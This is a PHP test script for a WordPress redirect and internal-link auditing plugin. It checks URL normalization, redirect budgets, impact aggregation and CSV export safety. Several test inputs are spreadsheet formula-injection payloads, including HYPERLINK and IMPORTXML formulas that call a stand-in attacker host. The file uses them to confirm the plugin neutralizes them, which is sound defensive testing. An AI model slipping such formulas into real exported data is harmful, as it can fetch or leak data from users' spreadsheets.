<?php
/**
 * Focused behavioral tests for the single-file plugin.
 *
 * Run with: php tests/behavioral.php
 */

declare(strict_types=1);

define( 'ABSPATH', __DIR__ . '/' );

$GLOBALS['indexlane_test_http_calls'] = array();
$GLOBALS['indexlane_test_responses']  = array();
$GLOBALS['indexlane_test_transients'] = array();
$GLOBALS['indexlane_test_user_id']    = 7;
$GLOBALS['indexlane_test_uuid_count'] = 0;
$GLOBALS['indexlane_test_translations'] = array();
$GLOBALS['indexlane_test_actions']      = array();
$GLOBALS['indexlane_test_admin_pages']  = array();
$GLOBALS['indexlane_test_styles']       = array();

class WP_Error {
	/** @var string */
	private $message;

	public function __construct( string $message ) {
		$this->message = $message;
	}

	public function get_error_message(): string {
		return $this->message;
	}
}

function add_action( string $hook_name, $callback ): void {
	$GLOBALS['indexlane_test_actions'][ $hook_name ][] = $callback;
}
function add_management_page( string $page_title, string $menu_title, string $capability, string $menu_slug, $callback ): string {
	$GLOBALS['indexlane_test_admin_pages'][] = array(
		'page_title' => $page_title,
		'menu_title' => $menu_title,
		'capability' => $capability,
		'menu_slug'  => $menu_slug,
		'callback'   => $callback,
	);

	return 'tools_page_' . $menu_slug;
}
function plugins_url( string $path, string $plugin_file = '' ): string {
	return 'https://example.test/wp-content/plugins/indexlane-redirect-internal-link-auditor/' . ltrim( $path, '/' );
}
function wp_enqueue_style( string $handle, string $src, array $dependencies = array(), string $version = '' ): void {
	$GLOBALS['indexlane_test_styles'][] = array(
		'handle'       => $handle,
		'src'          => $src,
		'dependencies' => $dependencies,
		'version'      => $version,
	);
}
function plugin_basename( string $file ): string {
	return basename( $file );
}
function home_url(): string {
	return 'https://example.test/';
}
function wp_parse_url( string $url, int $component = -1 ) {
	return -1 === $component ? parse_url( $url ) : parse_url( $url, $component );
}
function __( string $text ): string {
	return isset( $GLOBALS['indexlane_test_translations'][ $text ] )
		? $GLOBALS['indexlane_test_translations'][ $text ]
		: $text;
}
function is_wp_error( $value ): bool {
	return $value instanceof WP_Error;
}
function wp_remote_retrieve_response_code( $response ): int {
	return isset( $response['response']['code'] ) ? (int) $response['response']['code'] : 0;
}
function wp_remote_retrieve_header( $response, string $name ) {
	return isset( $response['headers'][ strtolower( $name ) ] ) ? $response['headers'][ strtolower( $name ) ] : '';
}
function esc_url_raw( string $url ): string {
	return filter_var( $url, FILTER_VALIDATE_URL ) ? $url : '';
}
function wp_safe_remote_get( string $url, array $args ) {
	$GLOBALS['indexlane_test_http_calls'][] = array(
		'url'  => $url,
		'args' => $args,
	);

	if ( ! array_key_exists( $url, $GLOBALS['indexlane_test_responses'] ) ) {
		return new WP_Error( 'Unexpected URL: ' . $url );
	}

	return $GLOBALS['indexlane_test_responses'][ $url ];
}
function wp_generate_uuid4(): string {
	$GLOBALS['indexlane_test_uuid_count']++;
	return sprintf( '12345678-1234-4abc-8def-%012d', $GLOBALS['indexlane_test_uuid_count'] );
}
function get_current_user_id(): int {
	return (int) $GLOBALS['indexlane_test_user_id'];
}
function set_transient( string $key, $value, int $expiration ): bool {
	$GLOBALS['indexlane_test_transients'][ $key ] = array(
		'value'      => $value,
		'expiration' => $expiration,
	);
	return true;
}
function get_transient( string $key ) {
	return isset( $GLOBALS['indexlane_test_transients'][ $key ] )
		? $GLOBALS['indexlane_test_transients'][ $key ]['value']
		: false;
}

require dirname( __DIR__ ) . '/indexlane-redirect-internal-link-auditor.php';

/**
 * @return mixed
 */
function indexlane_invoke( string $method, array $arguments = array() ) {
	$reflection = new ReflectionMethod( 'IndexLane_Redirect_Internal_Link_Auditor', $method );
	if ( PHP_VERSION_ID < 80100 ) {
		$reflection->setAccessible( true );
	}
	return $reflection->invokeArgs( null, $arguments );
}

function indexlane_assert_same( $expected, $actual, string $message ): void {
	if ( $expected !== $actual ) {
		fwrite(
			STDERR,
			$message . "\nExpected: " . var_export( $expected, true ) . "\nActual: " . var_export( $actual, true ) . "\n"
		);
		exit( 1 );
	}
}

function indexlane_response( int $status, string $location = '' ): array {
	return array(
		'response' => array( 'code' => $status ),
		'headers'  => '' === $location ? array() : array( 'location' => $location ),
		'body'     => '',
	);
}

indexlane_assert_same( true, isset( $GLOBALS['indexlane_test_actions']['admin_menu'] ), 'The Tools page must be registered on admin_menu.' );
indexlane_assert_same( true, isset( $GLOBALS['indexlane_test_actions']['admin_enqueue_scripts'] ), 'Admin styles must use admin_enqueue_scripts.' );
indexlane_assert_same( true, isset( $GLOBALS['indexlane_test_actions']['admin_init'] ), 'CSV exports must remain registered on admin_init.' );

indexlane_invoke( 'register_admin_page' );
indexlane_assert_same(
	'indexlane-redirect-internal-link-auditor',
	$GLOBALS['indexlane_test_admin_pages'][0]['menu_slug'],
	'The Tools page must retain the submitted plugin slug.'
);

indexlane_invoke( 'enqueue_admin_styles', array( 'dashboard' ) );
indexlane_assert_same( array(), $GLOBALS['indexlane_test_styles'], 'The plugin stylesheet must not load on unrelated admin pages.' );

indexlane_invoke( 'enqueue_admin_styles', array( 'tools_page_indexlane-redirect-internal-link-auditor' ) );
indexlane_assert_same(
	array(
		array(
			'handle'       => 'indexlane-rila-admin',
			'src'          => 'https://example.test/wp-content/plugins/indexlane-redirect-internal-link-auditor/assets/admin.css',
			'dependencies' => array(),
			'version'      => '0.2.2',
		),
	),
	$GLOBALS['indexlane_test_styles'],
	'The plugin stylesheet must load with the release version only on its Tools page.'
);

/**
 * Build one complete stored result row for report tests.
 *
 * @return array<string,mixed>
 */
function indexlane_result_row(
	string $source_url,
	string $linked_url,
	string $http_status,
	int $redirect_count,
	string $final_url,
	string $warning,
	string $result,
	string $source_title = 'Source',
	string $anchor_text = 'Link'
): array {
	return array(
		'source_title'    => $source_title,
		'source_type'     => 'Page',
		'source_url'      => $source_url,
		'source_edit_url' => 'https://example.test/wp-admin/post.php?post=1&action=edit',
		'linked_url'      => $linked_url,
		'http_status'     => $http_status,
		'redirect_count'  => $redirect_count,
		'final_url'       => $final_url,
		'warning'         => $warning,
		'anchor_text'     => $anchor_text,
		'result'          => $result,
	);
}

$without_slash = indexlane_invoke( 'normalize_url_for_compare', array( 'https://Example.test/foo#section' ) );
$with_slash    = indexlane_invoke( 'normalize_url_for_compare', array( 'https://example.test/foo/' ) );
indexlane_assert_same( 'https://example.test/foo', $without_slash, 'The cache key should normalize scheme and host case.' );
indexlane_assert_same( 'https://example.test/foo/', $with_slash, 'The cache key should preserve a trailing slash.' );
$resolved_with_query = indexlane_invoke( 'make_absolute_url', array( '/foo/?page=2', 'https://example.test/source/' ) );
indexlane_assert_same( 'https://example.test/foo/?page=2', $resolved_with_query, 'Relative redirect resolution should preserve a trailing slash before a query string.' );

$normalized_destination = indexlane_invoke( 'normalize_destination_for_impact', array( 'https://Example.test:443/foo#section' ) );
indexlane_assert_same( 'https://example.test/foo', $normalized_destination, 'Impact grouping should normalize scheme/host case, default ports, and fragments.' );
indexlane_assert_same(
	'https://example.test/foo/?page=2',
	indexlane_invoke( 'normalize_destination_for_impact', array( 'https://example.test/foo/?page=2#fragment' ) ),
	'Impact grouping should preserve trailing slashes and query strings.'
);

$impact_input = array(
	indexlane_result_row(
		'https://Example.test/source-a#top',
		'https://Example.test:443/broken#first',
		'404',
		0,
		'https://example.test/broken',
		'Broken link (404)',
		'Error'
	),
	indexlane_result_row(
		'https://example.test/source-a',
		'https://example.test/broken#second',
		'404',
		0,
		'https://example.test/broken',
		'Broken link (404)',
		'Error'
	),
	indexlane_result_row(
		'https://example.test/source-b',
		'https://example.test/broken',
		'301 -> 404',
		1,
		'https://example.test/gone',
		'Redirect (301); Broken link (404)',
		'Error'
	),
	indexlane_result_row(
		'https://example.test/source-c',
		'https://example.test/broken/',
		'410',
		0,
		'https://example.test/broken/',
		'Broken link (410)',
		'Error'
	),
	indexlane_result_row(
		'https://example.test/source-d',
		'https://example.test/server-error',
		'503',
		0,
		'https://example.test/server-error',
		'HTTP error (503)',
		'Error'
	),
	indexlane_result_row(
		'https://example.test/source-e',
		'https://example.test/no-location',
		'302',
		0,
		'https://example.test/no-location',
		'Redirect without final target (302)',
		'Needs review'
	),
	indexlane_result_row(
		'https://example.test/source-f',
		'https://example.test/alpha',
		'301 -> 200',
		1,
		'https://example.test/new-alpha',
		'Redirect (301)',
		'Warning'
	),
	indexlane_result_row(
		'https://example.test/source-g',
		'https://example.test/beta',
		'301 -> 200',
		1,
		'https://example.test/new-beta',
		'Redirect (301)',
		'Warning'
	),
	indexlane_result_row(
		'https://example.test/source-h',
		'https://example.test/query?id=1',
		'302 -> 200',
		1,
		'https://example.test/new-query?id=1',
		'Redirect (302)',
		'Warning'
	),
	indexlane_result_row(
		'https://example.test/source-i',
		'https://example.test/query?id=2',
		'302 -> 200',
		1,
		'https://example.test/new-query?id=2',
		'Redirect (302)',
		'Warning'
	),
	indexlane_result_row(
		'https://example.test/source-z',
		'https://example.test/healthy',
		'200',
		0,
		'https://example.test/healthy',
		'None',
		'OK'
	),
);

$http_calls_before_impact = count( $GLOBALS['indexlane_test_http_calls'] );
$impact_rows              = indexlane_invoke( 'build_destination_impact', array( $impact_input ) );
indexlane_assert_same( $http_calls_before_impact, count( $GLOBALS['indexlane_test_http_calls'] ), 'Impact aggregation must not make HTTP requests.' );
indexlane_assert_same( 8, count( $impact_rows ), 'Only broken/error and redirected destinations should appear in the impact view.' );
indexlane_assert_same( 'https://example.test/broken', $impact_rows[0]['destination_url'], 'The highest-impact destination should sort first.' );
indexlane_assert_same( 3, $impact_rows[0]['occurrences'], 'Repeated links should count as separate occurrences.' );
indexlane_assert_same( 2, $impact_rows[0]['affected_sources'], 'Repeated links in one source should count as one affected content item.' );
indexlane_assert_same( 'Broken/error after redirect', $impact_rows[0]['impact'], 'A broken target with redirect evidence should expose both conditions.' );
indexlane_assert_same( '301 -> 404 | 404', $impact_rows[0]['http_status_evidence'], 'Status variants should be deduplicated and sorted deterministically.' );
indexlane_assert_same( 1, $impact_rows[0]['max_redirect_count'], 'The aggregate should retain the maximum observed redirect count.' );
indexlane_assert_same(
	'https://example.test/broken | https://example.test/gone',
	$impact_rows[0]['effective_final_url'],
	'All distinct effective final URLs should be preserved as deterministic evidence.'
);

$impact_destinations = array_column( $impact_rows, 'destination_url' );
indexlane_assert_same(
	array(
		'https://example.test/broken',
		'https://example.test/broken/',
		'https://example.test/server-error',
		'https://example.test/no-location',
		'https://example.test/alpha',
		'https://example.test/beta',
		'https://example.test/query?id=1',
		'https://example.test/query?id=2',
	),
	$impact_destinations,
	'Impact rows should preserve trailing-slash/query distinctions and use explicit deterministic tie ordering.'
);
indexlane_assert_same( 'Redirect', $impact_rows[3]['impact'], 'A terminal redirect without a Location header must still appear as redirect impact.' );

$GLOBALS['indexlane_test_translations'] = array(
	'Error'        => 'Fehler',
	'Broken/error' => 'Defekt/Fehler',
);
$localized_impact = indexlane_invoke(
	'build_destination_impact',
	array(
		array(
			indexlane_result_row(
				'https://example.test/source',
				'not a valid absolute URL',
				'',
				0,
				'',
				'Ungültige URL',
				'Fehler'
			),
		),
	)
);
indexlane_assert_same( 1, count( $localized_impact ), 'Localized Error results should remain actionable without English warning matching.' );
indexlane_assert_same( 'not a valid absolute URL', $localized_impact[0]['destination_url'], 'Invalid linked URLs should remain visible under a raw fallback group key.' );
indexlane_assert_same( 'Defekt/Fehler', $localized_impact[0]['impact'], 'Impact labels should use the active translation.' );
indexlane_assert_same( 'Fehler', $localized_impact[0]['result'], 'Localized result labels should retain their severity.' );
$GLOBALS['indexlane_test_translations'] = array();

$details_csv = indexlane_invoke(
	'build_csv_rows',
	array(
		array(
			indexlane_result_row(
				'https://example.test/source',
				'https://example.test/broken',
				'404',
				0,
				'https://example.test/broken',
				'Broken link (404)',
				'Error',
				' =HYPERLINK("https://attacker.test")',
				"\n+SUM(1,1)"
			),
		),
		'details',
	)
);
indexlane_assert_same( 'Source Post/Page', $details_csv[0][0], 'Detailed CSV should retain its existing first column.' );
indexlane_assert_same( '\' =HYPERLINK("https://attacker.test")', $details_csv[1][0], 'CSV safety should block formulas after leading spaces.' );
indexlane_assert_same( "'\n+SUM(1,1)", $details_csv[1][8], 'CSV safety should block formulas after leading newlines.' );

$impact_csv_input = array(
	indexlane_result_row(
		'https://example.test/source',
		'https://example.test/broken',
		'404',
		0,
		'https://example.test/broken',
		'=IMPORTXML("https://attacker.test") Broken link (404)',
		'Error'
	),
);
$impact_csv = indexlane_invoke( 'build_csv_rows', array( $impact_csv_input, 'impact' ) );
indexlane_assert_same( 'Destination', $impact_csv[0][0], 'Impact CSV should have a destination-centric header.' );
indexlane_assert_same( '\'=IMPORTXML("https://attacker.test") Broken link (404)', $impact_csv[1][8], 'Impact evidence should receive the same CSV formula protection.' );
indexlane_assert_same( "'\t@SUM(1,1)", indexlane_invoke( 'csv_safe', array( "\t@SUM(1,1)" ) ), 'CSV safety should block formulas after a leading tab.' );
indexlane_assert_same( "'-2+3", indexlane_invoke( 'csv_safe', array( '-2+3' ) ), 'CSV safety should block minus-prefixed formulas.' );
indexlane_assert_same( ' ordinary text', indexlane_invoke( 'csv_safe', array( ' ordinary text' ) ), 'CSV safety should not alter non-formula text.' );

$GLOBALS['indexlane_test_http_calls'] = array();
$GLOBALS['indexlane_test_responses']  = array(
	'https://example.test/foo'  => indexlane_response( 301, '/foo/' ),
	'https://example.test/foo/' => indexlane_response( 200 ),
);
$request_count = 0;
$check_args    = array( 'https://example.test/foo', 2.0, 5, &$request_count );
$check         = indexlane_invoke( 'check_url', $check_args );
indexlane_assert_same( array( '301', '200' ), $check['statuses'], 'GET evidence should include the redirect and distinct trailing-slash target.' );
indexlane_assert_same( false, $check['redirect_loop'], 'A normal /foo to /foo/ redirect must not be treated as a loop.' );
indexlane_assert_same( 'https://example.test/foo/', $check['final_url'], 'The trailing-slash destination should be fetched.' );
indexlane_assert_same( 2, $request_count, 'Every redirect hop should consume exactly one request-budget unit.' );
indexlane_assert_same( 2, count( $GLOBALS['indexlane_test_http_calls'] ), 'Each budget unit should map to one HTTP API call.' );
indexlane_assert_same( 0, $GLOBALS['indexlane_test_http_calls'][0]['args']['redirection'], 'WordPress must not follow redirects outside the audited redirect loop.' );
indexlane_assert_same( true, $GLOBALS['indexlane_test_http_calls'][0]['args']['reject_unsafe_urls'], 'Requests must use unsafe-URL rejection.' );
indexlane_assert_same( 4096, $GLOBALS['indexlane_test_http_calls'][0]['args']['limit_response_size'], 'GET response bodies must be bounded.' );

$GLOBALS['indexlane_test_http_calls'] = array();
$GLOBALS['indexlane_test_responses']  = array(
	'https://example.test/start' => indexlane_response( 302, '/finish' ),
	'https://example.test/finish' => indexlane_response( 200 ),
);
$request_count = 249;
$budget_args   = array( 'https://example.test/start', 2.0, 5, &$request_count );
$budget_check  = indexlane_invoke( 'check_url', $budget_args );
indexlane_assert_same( true, $budget_check['budget_exhausted'], 'A redirect chain should stop when the actual request budget is exhausted.' );
indexlane_assert_same( 250, $request_count, 'The actual request count must never exceed the hard limit.' );
indexlane_assert_same( 1, count( $GLOBALS['indexlane_test_http_calls'] ), 'No HTTP call may occur after request 250.' );

$results = array( array( 'linked_url' => 'https://example.test/foo/' ) );
$token   = indexlane_invoke( 'store_export_results', array( $results ) );
$loaded  = indexlane_invoke( 'get_export_results', array( $token ) );
indexlane_assert_same( $results, $loaded, 'CSV export should load the exact saved result set.' );
$saved_transient = reset( $GLOBALS['indexlane_test_transients'] );
indexlane_assert_same( 3600, $saved_transient['expiration'], 'Saved export results should expire after one hour.' );

$GLOBALS['indexlane_test_user_id'] = 8;
$other_user_results = indexlane_invoke( 'get_export_results', array( $token ) );
indexlane_assert_same( null, $other_user_results, 'Saved export results must be scoped to the administrator who ran the scan.' );

fwrite( STDOUT, "All behavioral tests passed.\n" );
